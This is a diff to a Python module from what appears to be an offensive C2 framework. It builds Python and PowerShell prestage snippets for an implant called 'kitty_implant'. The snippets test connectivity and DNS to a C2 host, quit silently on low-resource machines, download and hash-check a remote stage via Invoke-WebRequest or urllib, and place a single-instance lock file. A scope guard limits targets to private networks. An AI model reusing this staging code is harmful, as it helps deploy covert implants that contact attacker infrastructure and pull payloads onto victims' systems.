@@ -1,34 +1,83 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-"""Bootstrap snippets for guard-style offline prestage modules."""
+"""Bootstrap builders for guard-style offline prestage modules (Python/PowerShell)."""
 
 from __future__ import annotations
 
 import json
-from typing import Iterable, List
+import re
+from typing import Any, Dict, Iterable, List, Optional, Tuple
+
+from core.framework.base_module import BaseModule
 
 
-def _json_list(values: Iterable[str]) -> str:
-    return json.dumps(list(values), separators=(",", ":"))
+class Prestage_guards(BaseModule):
+    """Shared prestage guard helpers — inherit in ``modules/prestage`` to override emitters."""
 
+    DEFAULT_PRIVATE_CIDRS: Tuple[str, ...] = (
+        "10.0.0.0/8",
+        "172.16.0.0/12",
+        "192.168.0.0/16",
+        "127.0.0.0/8",
+    )
 
-def build_scope_guard_bootstrap(
-    *,
-    c2_host: str = "",
-    allowed_hosts: List[str] | None = None,
-    allowed_cidrs: List[str] | None = None,
-) -> str:
-    hosts = allowed_hosts or []
-    cidrs = allowed_cidrs or ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"]
-    return f"""
+    @staticmethod
+    def json_list(values: Iterable[str]) -> str:
+        return json.dumps(list(values), separators=(",", ":"))
+
+    @classmethod
+    def safe_lock_token(cls, raw: str) -> str:
+        token = re.sub(r"[^a-zA-Z0-9_.-]+", "_", str(raw or "kitty_implant")).strip("._")[:48]
+        return token or "kitty_implant"
+
+    @classmethod
+    def escape_ps_single_quoted(cls, value: str) -> str:
+        return str(value or "").replace("'", "''")
+
+    @classmethod
+    def parse_scope_selection(cls, raw_scope: str, *, c2_host: str = "") -> Tuple[List[str], List[str]]:
+        allowed_hosts: List[str] = []
+        allowed_cidrs: List[str] = []
+        for token in [part.strip() for part in str(raw_scope or "").split(",") if part.strip()]:
+            if "/" in token:
+                allowed_cidrs.append(token)
+            else:
+                allowed_hosts.append(token)
+        host = str(c2_host or "").strip()
+        if host and host not in allowed_hosts:
+            allowed_hosts.append(host)
+        return allowed_hosts, allowed_cidrs
+
+    @classmethod
+    def resolve_lock_id(cls, context: Optional[Dict[str, Any]] = None, *, module_lock: str = "") -> str:
+        ctx = dict(context or {})
+        raw = (
+            str(ctx.get("prestage_lock_id") or "").strip()
+            or str(module_lock or "").strip()
+            or str(ctx.get("c2_host") or "").strip()
+            or "kitty_implant"
+        )
+        return cls.safe_lock_token(raw)
+
+    @classmethod
+    def build_scope_guard_bootstrap(
+        cls,
+        *,
+        c2_host: str = "",
+        allowed_hosts: List[str] | None = None,
+        allowed_cidrs: List[str] | None = None,
+    ) -> str:
+        hosts = allowed_hosts or []
+        cidrs = allowed_cidrs or list(cls.DEFAULT_PRIVATE_CIDRS)
+        return f"""
 import ipaddress as _ip
 import socket as _sock
 import sys as _sys
 
 _kitty_scope_host = {c2_host!r}
-_kitty_scope_allowed_hosts = {_json_list(hosts)}
-_kitty_scope_allowed_cidrs = {_json_list(cidrs)}
+_kitty_scope_allowed_hosts = {cls.json_list(hosts)}
+_kitty_scope_allowed_cidrs = {cls.json_list(cidrs)}
 
 def _kitty_scope_host_allowed(_host):
     _host = str(_host or "").strip()
@@ -59,9 +108,40 @@ if _kitty_scope_host and not _kitty_scope_host_allowed(_kitty_scope_host):
     _sys.exit(0)
 """.strip()
 
+    @classmethod
+    def build_scope_guard_powershell(cls, *, c2_host: str = "", extra_scope_csv: str = "") -> str:
+        ps_host = cls.escape_ps_single_quoted(c2_host)
+        ps_scope = cls.escape_ps_single_quoted(extra_scope_csv)
+        return f"""
+$ErrorActionPreference='SilentlyContinue'
+$c2Host='{ps_host}'
+$allowed=@('10.0.0.0/8','172.16.0.0/12','192.168.0.0/16','127.0.0.0/8')
+if('{ps_scope}'){{ $allowed += '{ps_scope}'.Split(',') | ForEach-Object {{ $_.Trim() }} | Where-Object {{ $_ }} }}
+function _KittyScopeAllowed($hostName){{
+  if(-not $hostName){{ return $false }}
+  try {{
+    $ip=[System.Net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($hostName)[0].IPAddressToString)
+    foreach($cidr in $allowed){{
+      if($cidr -notmatch '/'){{ if($hostName -eq $cidr){{ return $true }}; continue }}
+      $parts=$cidr.Split('/'); $net=$parts[0]; $bits=[int]$parts[1]
+      $mask=[uint32]([math]::Pow(2,32)-[math]::Pow(2,(32-$bits)))
+      $netIp=[System.Net.IPAddress]::Parse($net).GetAddressBytes(); [Array]::Reverse($netIp)
+      $netNum=[BitConverter]::ToUInt32($netIp,0)
+      $ipBytes=$ip.GetAddressBytes(); [Array]::Reverse($ipBytes)
+      $ipNum=[BitConverter]::ToUInt32($ipBytes,0)
+      if(($ipNum -band $mask) -eq ($netNum -band $mask)){{ return $true }}
+    }}
+  }} catch {{}}
+  return $false
+}}
+if($c2Host -and -not (_KittyScopeAllowed $c2Host)){{ try {{ _KittyTelemetryRecord 'scope_guard' 'blocked' $c2Host }} catch {{}}; exit 0 }}
+""".strip()
 
-def build_network_preflight_bootstrap(*, c2_host: str = "", c2_port: int = 8088, timeout: float = 3.0) -> str:
-    return f"""
+    @classmethod
+    def build_network_preflight_bootstrap(
+        cls, *, c2_host: str = "", c2_port: int = 8088, timeout: float = 3.0
+    ) -> str:
+        return f"""
 import socket as _sock
 import sys as _sys
 
@@ -87,9 +167,26 @@ else:
     _kitty_network_preflight["error"] = "missing c2 host"
 """.strip()
 
+    @classmethod
+    def build_network_preflight_powershell(cls, *, c2_host: str = "", c2_port: int = 8088, timeout_ms: int = 3000) -> str:
+        ps_host = cls.escape_ps_single_quoted(c2_host)
+        return f"""
+$ErrorActionPreference='SilentlyContinue'
+$global:_kitty_network_preflight=@{{ ok=$false; error='' }}
+try {{
+  $client=New-Object System.Net.Sockets.TcpClient
+  $iar=$client.BeginConnect('{ps_host}',{int(c2_port)},$null,$null)
+  if($iar.AsyncWaitHandle.WaitOne({int(timeout_ms)},$false)){{ $client.EndConnect($iar)|Out-Null; $global:_kitty_network_preflight.ok=$true }}
+  $client.Close()
+}} catch {{
+  $global:_kitty_network_preflight.error=$_.Exception.Message
+  try {{ _KittyTelemetryRecord 'network_preflight' 'failed' $global:_kitty_network_preflight.error }} catch {{}}
+}}
+""".strip()
 
-def build_resource_guard_bootstrap(*, min_mem_mb: int = 32, min_disk_mb: int = 10) -> str:
-    return f"""
+    @classmethod
+    def build_resource_guard_bootstrap(cls, *, min_mem_mb: int = 32, min_disk_mb: int = 10) -> str:
+        return f"""
 import os as _os
 import shutil as _shutil
 import sys as _sys
@@ -123,11 +220,22 @@ if _kitty_resource_guard["disk_mb"] and _kitty_resource_guard["disk_mb"] < _min_
     _sys.exit(0)
 """.strip()
 
+    @classmethod
+    def build_resource_guard_powershell(cls, *, min_mem_mb: int = 32, min_disk_mb: int = 10) -> str:
+        return f"""
+$ErrorActionPreference='SilentlyContinue'
+$global:_kitty_resource_guard=@{{ ok=$true; mem_mb=0; disk_mb=0 }}
+try {{ $global:_kitty_resource_guard.disk_mb=[int]((Get-PSDrive -Name C).Free/1MB) }} catch {{}}
+try {{ $global:_kitty_resource_guard.mem_mb=[int]((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1MB) }} catch {{}}
+if($global:_kitty_resource_guard.mem_mb -gt 0 -and $global:_kitty_resource_guard.mem_mb -lt {int(min_mem_mb)}){{ try {{ _KittyTelemetryRecord 'resource_guard' 'low_memory' $global:_kitty_resource_guard.mem_mb }} catch {{}}; exit 0 }}
+if($global:_kitty_resource_guard.disk_mb -gt 0 -and $global:_kitty_resource_guard.disk_mb -lt {int(min_disk_mb)}){{ try {{ _KittyTelemetryRecord 'resource_guard' 'low_disk' $global:_kitty_resource_guard.disk_mb }} catch {{}}; exit 0 }}
+""".strip()
 
-def build_stage_verify_bootstrap(*, stage_url: str = "", stage_sha256: str = "") -> str:
-    if not stage_url and not stage_sha256:
-        return "pass  # stage_verify: no stage_url/sha256 configured"
-    return f"""
+    @classmethod
+    def build_stage_verify_bootstrap(cls, *, stage_url: str = "", stage_sha256: str = "") -> str:
+        if not stage_url and not stage_sha256:
+            return "pass  # stage_verify: no stage_url/sha256 configured"
+        return f"""
 import hashlib as _hashlib
 import urllib.request as _urlreq
 
@@ -158,3 +266,129 @@ except Exception as _exc:
         pass
     raise
 """.strip()
+
+    @classmethod
+    def build_stage_verify_powershell(cls, *, stage_url: str = "", stage_sha256: str = "") -> str:
+        if not stage_url and not stage_sha256:
+            return "# stage_verify: no stage_url/sha256 configured"
+        ps_url = cls.escape_ps_single_quoted(stage_url)
+        ps_sha = cls.escape_ps_single_quoted(stage_sha256.lower())
+        return f"""
+$ErrorActionPreference='Stop'
+try {{
+  $bytes=$null
+  if('{ps_url}'){{
+    if($global:_kitty_stage_cache){{ $bytes=$global:_kitty_stage_cache.fetch('{ps_url}','{ps_sha}') }}
+    else {{ $bytes=(Invoke-WebRequest -Uri '{ps_url}' -UseBasicParsing -TimeoutSec 30).Content }}
+  }}
+  if('{ps_sha}'){{
+    $sha=[System.Security.Cryptography.SHA256]::Create()
+    $digest=([BitConverter]::ToString($sha.ComputeHash([byte[]]$bytes))).Replace('-','').ToLower()
+    if($digest -ne '{ps_sha}'){{ throw 'stage sha256 mismatch' }}
+  }}
+}} catch {{
+  try {{ _KittyTelemetryRecord 'stage_verify' 'failed' $_.Exception.Message }} catch {{}}
+  throw
+}}
+""".strip()
+
+    @classmethod
+    def build_dns_preflight_bootstrap(cls, *, c2_host: str = "", timeout: float = 3.0) -> str:
+        if not c2_host:
+            return "pass  # dns_preflight: set lhost on payload"
+        return f"""
+import ipaddress as _ip
+import socket as _sock
+import sys as _sys
+
+_kitty_dns_host = {c2_host!r}
+_kitty_dns_timeout = {float(timeout)}
+try:
+    _ip.ip_address(_kitty_dns_host)
+except ValueError:
+    try:
+        _prev = _sock.getdefaulttimeout()
+        _sock.setdefaulttimeout(_kitty_dns_timeout)
+        try:
+            _sock.getaddrinfo(_kitty_dns_host, 0, type=_sock.SOCK_STREAM)
+        finally:
+            _sock.setdefaulttimeout(_prev)
+    except Exception as _exc:
+        try:
+            _kitty_telemetry_record("dns_preflight", "failed", str(_exc))
+        except Exception:
+            pass
+        _sys.exit(0)
+""".strip()
+
+    @classmethod
+    def build_dns_preflight_powershell(cls, *, c2_host: str = "", timeout_ms: int = 3000) -> str:
+        if not c2_host:
+            return "# dns_preflight: set lhost on payload"
+        ps_host = cls.escape_ps_single_quoted(c2_host)
+        return f"""
+$ErrorActionPreference='SilentlyContinue'
+$c2Host='{ps_host}'
+$ip=$null
+try {{ $ip=[System.Net.IPAddress]::Parse($c2Host) }} catch {{}}
+if(-not $ip){{
+  try {{
+    $job=Start-Job {{ param($h) [System.Net.Dns]::GetHostAddresses($h) }} -ArgumentList $c2Host
+    if(-not (Wait-Job $job -Timeout ({int(timeout_ms)}/1000.0))){{ Stop-Job $job|Out-Null; throw 'dns_timeout' }}
+    Receive-Job $job|Out-Null
+    Remove-Job $job|Out-Null
+  }} catch {{
+    try {{ _KittyTelemetryRecord 'dns_preflight' 'failed' $_.Exception.Message }} catch {{}}
+    exit 0
+  }}
+}}
+""".strip()
+
+    @classmethod
+    def build_single_instance_bootstrap(cls, *, lock_id: str = "kitty_implant") -> str:
+        lock = cls.safe_lock_token(lock_id)
+        return f"""
+import os as _os
+import sys as _sys
+import tempfile as _tmp
+
+_kitty_run_lock = _os.path.join(_tmp.gettempdir(), ".kitty_run_{lock}.lock")
+try:
+    _fd = _os.open(_kitty_run_lock, _os.O_CREAT | _os.O_EXCL | _os.O_WRONLY)
+    try:
+        _os.write(_fd, str(_os.getpid()).encode("utf-8", errors="replace"))
+    finally:
+        _os.close(_fd)
+except FileExistsError:
+    try:
+        _kitty_telemetry_record("single_instance", "already_running", _kitty_run_lock)
+    except Exception:
+        pass
+    _sys.exit(0)
+except Exception:
+    pass
+""".strip()
+
+    @classmethod
+    def build_single_instance_powershell(cls, *, lock_id: str = "kitty_implant") -> str:
+        lock = cls.safe_lock_token(lock_id)
+        return f"""
+$ErrorActionPreference='SilentlyContinue'
+$lock=Join-Path $env:TEMP '.kitty_run_{lock}.lock'
+if(Test-Path $lock){{ try {{ _KittyTelemetryRecord 'single_instance' 'already_running' $lock }} catch {{}}; exit 0 }}
+try {{ New-Item -ItemType File -Path $lock -Force -ErrorAction Stop|Out-Null; Set-Content -Path $lock -Value $PID }} catch {{
+  try {{ _KittyTelemetryRecord 'single_instance' 'already_running' $lock }} catch {{}}
+  exit 0
+}}
+""".strip()
+
+
+# Backward-compatible module-level aliases
+_json_list = Prestage_guards.json_list
+_safe_lock_token = Prestage_guards.safe_lock_token
+build_scope_guard_bootstrap = Prestage_guards.build_scope_guard_bootstrap
+build_network_preflight_bootstrap = Prestage_guards.build_network_preflight_bootstrap
+build_resource_guard_bootstrap = Prestage_guards.build_resource_guard_bootstrap
+build_stage_verify_bootstrap = Prestage_guards.build_stage_verify_bootstrap
+build_dns_preflight_bootstrap = Prestage_guards.build_dns_preflight_bootstrap
+build_single_instance_bootstrap = Prestage_guards.build_single_instance_bootstrap
